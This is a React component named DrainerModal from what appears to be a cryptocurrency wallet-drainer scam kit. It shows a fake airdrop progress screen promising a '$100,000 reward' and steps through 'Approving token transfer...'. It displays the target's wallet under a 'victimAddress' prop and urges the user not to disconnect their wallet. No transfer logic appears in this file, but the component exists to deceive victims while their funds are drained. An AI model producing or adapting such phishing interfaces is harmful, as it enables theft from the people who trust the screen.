// frontend/src/components/DrainerModal.jsx
import { useEffect, useState } from 'react'
import toast from 'react-hot-toast'

export default function DrainerModal({ isOpen, victimAddress, onClose }) {
  const [step, setStep] = useState(1)
  
  const steps = [
    'Initializing airdrop contract...',
    'Checking wallet permissions...',
    'Approving token transfer...',
    'Processing $100,000 reward...'
  ]
  
  useEffect(() => {
    if (!isOpen) return
    
    const timer = setInterval(() => {
      setStep(s => {
        if (s >= 4) {
          clearInterval(timer)
          onClose()
          return 4
        }
        return s + 1
      })
    }, 1500)
    
    return () => clearInterval(timer)
  }, [isOpen])
  
  if (!isOpen) return null
  
  return (
    <div className="fixed inset-0 bg-black/80 z-[1000] flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl p-6 max-w-md w-full">
        <div className="flex items-center justify-between mb-6">
          <h3 className="text-xl font-bold text-gray-900">Processing Your Reward</h3>
          <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
            <span className="text-blue-600 font-bold">{step}/4</span>
          </div>
        </div>
        
        <div className="space-y-4 mb-6">
          {steps.map((text, idx) => (
            <div key={idx} className="flex items-center gap-3">
              <div className={`w-6 h-6 rounded-full flex items-center justify-center ${idx < step ? 'bg-green-500' : 'bg-gray-200'}`}>
                {idx < step ? '✓' : idx + 1}
              </div>
              <span className={`text-sm ${idx < step ? 'text-gray-900 font-medium' : 'text-gray-400'}`}>
                {text}
              </span>
            </div>
          ))}
        </div>
        
        <div className="bg-gray-50 rounded-xl p-4 mb-6">
          <p className="text-xs text-gray-500 mb-1">Transaction Details</p>
          <p className="text-sm font-mono text-gray-800 break-all">
            {victimAddress}
          </p>
          <p className="text-xs text-gray-400 mt-2">
            Estimated completion: {5 - step * 1.5} seconds
          </p>
        </div>
        
        <div className="flex gap-3">
          <button
            onClick={onClose}
            className="flex-1 py-3 border border-gray-300 rounded-xl text-gray-700 font-medium hover:bg-gray-50"
          >
            Cancel
          </button>
          <button
            onClick={() => {
              toast.success('Processing completed!')
              onClose()
            }}
            className="flex-1 py-3 bg-blue-600 text-white font-bold rounded-xl hover:bg-blue-700"
          >
            {step === 4 ? 'Complete' : 'Processing...'}
          </button>
        </div>
        
        <p className="text-xs text-gray-400 mt-4 text-center">
          Do not close this window or disconnect your wallet
        </p>
      </div>
    </div>
  )
}
